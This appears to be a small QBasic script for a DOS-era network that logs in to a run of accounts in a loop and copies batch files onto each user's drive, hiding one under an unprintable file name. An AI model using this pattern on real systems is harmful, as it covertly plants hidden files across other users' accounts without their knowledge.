SHELL "f:login a8"
SHELL "copy/y c:\ÿÿÿ\bbs1.bat m:\ÿÿÿ.bat"
SHELL "copy/y c:\ÿÿÿ\bbs.bat m:\"
SHELL "attrib m:\ÿÿÿ.bat +h"
FOR i = 97 TO 100
FOR j = 1 TO 12
IF j <= 9 THEN m = 1 ELSE m = 2
IF i = 97 AND j = 8 THEN j = 9
SHELL "f:login.exe " + CHR$(i) + RIGHT$(STR$(j), m)
SHELL "copy/y c:\ÿÿÿ\bbs.bat m:\"
SHELL "copy/y c:\ÿÿÿ\ÿÿÿ.bat m:\"
SHELL "c:\dos\attrib m:\ÿÿÿ.bat +h"
'SHELL "edit m:\bbs.bat"
NEXT j, i
SYSTEM

